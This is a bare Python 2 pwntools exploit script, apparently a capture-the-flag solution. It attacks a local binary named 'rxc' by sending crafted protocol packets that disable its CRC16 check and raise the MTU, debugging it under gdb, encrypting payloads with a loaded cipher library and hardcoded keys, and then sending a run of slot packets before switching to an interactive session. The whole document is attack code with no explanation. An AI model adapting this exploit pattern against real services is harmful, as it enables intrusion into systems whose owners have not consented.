from pwn import * 
from ctypes import *

def crc16(s):
	a = 0xffff
	for c in map(ord, s):
		b = c
		for i in xrange(8):
			if ((a ^ b) & 1):
				a = (a >> 1) ^ 0x8408
			else:
				a >>= 1
			b >>= 1
	return (~(((a << 8) & 0xff00) | (a >> 8))) & 0xffff

if __name__ == '__main__':
	#crc16('1')
	r = process('./rxc')
	L = 0x20
	r.send('\x79\x32\x00'.ljust(L, '\x00')) # disable crc16
	L = 0xa0
	r.send(('\x79\x31' + chr(L)).ljust(0x20, '\x00')) # set mtu = L
	cnt = 0
	data = '\xE3' + chr(cnt) + '\x17\x70' + '\x00' * 0x60
	#gdb.attach(r, 'b *0x408BA3\nc')
	encipher_pdu = "0x4099A4"
	decipher_pdu = "0x409A42"
	bp = []
	init = 'set detach-on-fork off\nb *' + '\nb *'.join(bp) + '\nc'
	#print init
	gdb.attach(r, init)
	r.send(data.ljust(L, '\x00'))
	d = r.recv()
	Y = d[4:0x65]
	print Y.encode('hex')
	h = cdll.LoadLibrary('./cipher.so')
	h.init(c_longlong(0x455447651a6203b2L), c_longlong(0xb567c617a7dcfce6L), c_longlong(0x455447651a6203b2L), c_longlong(0xb567c617a7dcfce6L))
	end = 0
	num = 0
	slot_id = 0
	for slot_id in xrange(0xf, -1, -1):
		cnt += 1
		if slot_id == 0: end = 1
		c = p16((end << 15) | ((num & 0x7ff) << 4) | slot_id) + 'A' * (L - 5)
		h.cipher(c, len(c), 0)
		r.send('\xE3' + chr(cnt) + '\x73' + c)
	r.interactive()
